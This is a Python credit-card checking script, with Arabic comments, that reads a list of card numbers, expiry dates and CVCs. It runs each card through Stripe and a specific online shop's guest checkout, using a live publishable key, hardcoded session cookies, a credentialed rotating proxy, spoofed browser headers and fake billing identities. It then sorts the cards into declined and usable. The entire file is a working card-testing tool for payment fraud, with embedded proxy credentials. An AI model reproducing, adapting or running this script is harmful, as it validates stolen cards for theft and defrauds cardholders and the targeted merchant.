import requests,time
red = '\x1b[1;91m';yellow = '\x1b[1;93m';green = '\x1b[1;92m'
from faker import Faker
import random ,uuid
faker = Faker()
from getuseragent import UserAgent
lat = ''.join(random.choice('qwaszxcerdfvbtyghnmjkluiop0987654321') for i in range(18))
user_agent = UserAgent('windows').Random()
head1={
'user-agent':user_agent,
'Pragma':'no-cache',
'Accept':'*/*',
}
response1 = requests.get('https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US',headers=head1).json()
for x in response1['results']:
    name=x['name']['first']
    second=x['name']['last']
email=(name+second+'@outlook.com').lower()
fullname=name+' '+second
cookies2 = {'content-type':'application/x-www-form-urlencoded',}
Guid=str(requests.post('https://m.stripe.com/4',headers=head1,cookies=cookies2).text)
Muid=str(uuid.uuid1())
Sid=str(uuid.uuid1())
idz=[]
working = []
badcount = 0
workingcount = 0
import concurrent.futures
user_agent = UserAgent('windows').Random()
helll = ''.join(random.choice('qwaszxcerdfvbtyghnmjkluiop0987654321') for i in range(18))
firs = ''.join(random.choice('qwaszxcerdfvbtyghnmjk') for i in range(9))
las = ''.join(random.choice('qwaszxcerdfvbtyghnmjk') for i in range(9))
domin = random.choice(['@hotmail.com', '@aol.com', '@gmail.com', '@yahoo.com'])
email = helll + domin
def start():
    file = input('enter cc list: ')
    list = open(file, 'r')
    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:  #(اذا حبيت تسرع الفحص لكن بعد ماتضيف بروكسي)
        for list in list:
            line = list.strip().split('\n')[0]
            card, month, year, cvc = map(str.strip, line.split("|"))
            if '20' in year:
                year = year.replace('20','')
            executor.submit(process_request, line, card, month, year, cvc)
def process_request(line,card, month, year, cvc):
        proxy = 'http://kpjuqzse-rotate:pvvv6tdv45uh@p.webshare.io:80' # هنا البروكسي ولازم روتيتنغ مو عادي 
        proxs = { 
            'http': proxy, 
            'https': proxy
        }
        time_on_page = random.randint(30000, 120000)  
        headers = {
            'accept': 'application/json',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user_agent,
        }
        data = f'billing_details[address][postal_code]=10080&billing_details[address][country]=GB&billing_details[address][city]=Miami&billing_details[address][line1]=7135+73rd+Pl&billing_details[address][line2]=&billing_details[email]={email}&billing_details[name]=Enos+Abbott&billing_details[phone]=6185465467&type=card&card[number]={card}&card[cvc]={cvc}&card[exp_year]={year}&card[exp_month]={month}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2Fc9c125eeb4%3B+stripe-js-v3%2Fc9c125eeb4%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Fscbs.ltd&time_on_page={time_on_page}&client_attribution_metadata[client_session_id]=4f846196-f522-4f1d-846b-726d5de47b65&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&guid={Guid}&muid={Muid}&sid={Sid}&key=pk_live_51Jgv1WBqBHSorJhleLxOnO7E3FGbVqWFbt1KvPRGgKSjK4XdSwS4tVGK1sbDmBIqDU4izXgkoprykgqZQeYHTWoX00tFSxki6y&_stripe_version=2020-03-02'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        id =response.json()['id']
        cookies = {
            'PHPSESSID': 't03s97ks96qm81bjtdjtu5mbre',
            '_ga': 'GA1.1.2016625651.1737249503',
            'form_key': 'WeGl7RdiBSnTozwM',
            'mage-cache-storage': '{}',
            'mage-cache-storage-section-invalidation': '{}',
            'mage-cache-sessid': 'true',
            'form_key': 'WeGl7RdiBSnTozwM',
            'mage-messages': '',
            'recently_viewed_product': '{}',
            'recently_viewed_product_previous': '{}',
            'recently_compared_product': '{}',
            'recently_compared_product_previous': '{}',
            'product_data_storage': '{}',
            'twk_idm_key': 'q5scYspyi57sjAFyHAkQR',
            'searchReport-log': '0',
            'private_content_version': 'ffc5b96b6a2b280cdec46f56bb37e114',
            'TawkConnectionTime': '0',
            'twk_uuid_6710d2f94304e3196ad31f07': '%7B%22uuid%22%3A%221.6ArjqEBOwgHsKCpNLZH0ENtkuoUpno3MdlvadwHTje5HqQSTABuB0nDce62mMLvAFFwJdpACSzkltPje9Jtg0MfDUCigdE9ZFwClVdMfNCZg7fR3%22%2C%22version%22%3A3%2C%22domain%22%3A%22scbs.ltd%22%2C%22ts%22%3A1737249537686%7D',
            '__stripe_mid': '8a16c611-99f9-4130-ac8d-44dd6bd0b42a6c08ad',
            '__stripe_sid': '3520014d-d3ed-4d46-a476-51d57b30c5f9e09468',
            '_ga_2PT5P0LSXW': 'GS1.1.1737249503.1.1.1737249566.0.0.0',
            'section_data_ids': '{%22cart%22:1737249539%2C%22directory-data%22:1737249528%2C%22messages%22:1737249571}',
        }
        headers = {
            'accept': '*/*',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/json',
            # 'cookie': 'PHPSESSID=t03s97ks96qm81bjtdjtu5mbre; _ga=GA1.1.2016625651.1737249503; form_key=WeGl7RdiBSnTozwM; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; form_key=WeGl7RdiBSnTozwM; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; twk_idm_key=q5scYspyi57sjAFyHAkQR; searchReport-log=0; private_content_version=ffc5b96b6a2b280cdec46f56bb37e114; TawkConnectionTime=0; twk_uuid_6710d2f94304e3196ad31f07=%7B%22uuid%22%3A%221.6ArjqEBOwgHsKCpNLZH0ENtkuoUpno3MdlvadwHTje5HqQSTABuB0nDce62mMLvAFFwJdpACSzkltPje9Jtg0MfDUCigdE9ZFwClVdMfNCZg7fR3%22%2C%22version%22%3A3%2C%22domain%22%3A%22scbs.ltd%22%2C%22ts%22%3A1737249537686%7D; __stripe_mid=8a16c611-99f9-4130-ac8d-44dd6bd0b42a6c08ad; __stripe_sid=3520014d-d3ed-4d46-a476-51d57b30c5f9e09468; _ga_2PT5P0LSXW=GS1.1.1737249503.1.1.1737249566.0.0.0; section_data_ids={%22cart%22:1737249539%2C%22directory-data%22:1737249528%2C%22messages%22:1737249571}',
            'origin': 'https://scbs.ltd',
            'priority': 'u=1, i',
            'referer': 'https://scbs.ltd/checkout/index/index/',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user_agent,
            'x-requested-with': 'XMLHttpRequest',
        }
        json_data = {
            'cartId': 'GIa6nmh17oDmUaYXjEHwdiMNWLM9Jx9a',
            'billingAddress': {
                'countryId': 'GB',
                'region': '',
                'street': [
                    '7135 73rd Pl',
                    '',
                ],
                'company': '',
                'telephone': '6185465467',
                'postcode': '10080',
                'city': 'Miami',
                'firstname': 'Enos',
                'lastname': 'Abbott',
            },
            'paymentMethod': {
                'method': 'stripe_payments',
                'additional_data': {
                    'payment_method': id,
                },
                'extension_attributes': {},
            },
            'email': email,
        }
        response = requests.post(
            'https://scbs.ltd/rest/default/V1/guest-carts/GIa6nmh17oDmUaYXjEHwdiMNWLM9Jx9a/payment-information',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        #print(response.text)
        sec=response.text.split('Authentication Required: ')[1].split('"')[0]
        set=response.text.split('Authentication Required: ')[1].split('_se')[0]
        headers = {
            'accept': 'application/json',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user_agent,
        }
        params = {
            'is_stripe_sdk': 'false',
            'client_secret': sec,
            'key': 'pk_live_51Jgv1WBqBHSorJhleLxOnO7E3FGbVqWFbt1KvPRGgKSjK4XdSwS4tVGK1sbDmBIqDU4izXgkoprykgqZQeYHTWoX00tFSxki6y',
            '_stripe_version': '2020-03-02',
        }
        response = requests.get(f'https://api.stripe.com/v1/payment_intents/{set}', params=params, headers=headers)
        pay=response.text.split('three_d_secure_2_source": "')[1].split('"')[0]
        headers = {
            'accept': 'application/json',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user_agent,
        }
        data = f'source={pay}&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22864%22%2C%22browserScreenWidth%22%3A%221536%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F131.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_51Jgv1WBqBHSorJhleLxOnO7E3FGbVqWFbt1KvPRGgKSjK4XdSwS4tVGK1sbDmBIqDU4izXgkoprykgqZQeYHTWoX00tFSxki6y&_stripe_version=2020-03-02'
        response = requests.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=data)
        headers = {
            'accept': 'application/json',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': user_agent,
        }
        params = {
            'is_stripe_sdk': 'false',
            'client_secret': sec,
            'key': 'pk_live_51Jgv1WBqBHSorJhleLxOnO7E3FGbVqWFbt1KvPRGgKSjK4XdSwS4tVGK1sbDmBIqDU4izXgkoprykgqZQeYHTWoX00tFSxki6y',
            '_stripe_version': '2020-03-02',
        }
        response = requests.get(f'https://api.stripe.com/v1/payment_intents/{set}', params=params, headers=headers)
        if'card_error'in response.text:
            print(red,line,response.text.split('"decline_code": "')[1].split('"')[0],'|',response.text.split('message": "')[1].split('"')[0])
        elif 'requires_action' or 'requires_payment_method' in response.text:
             print(yellow,line,'requires_action')
        else:print(green,line,response.text)
        time.sleep(15)
start()
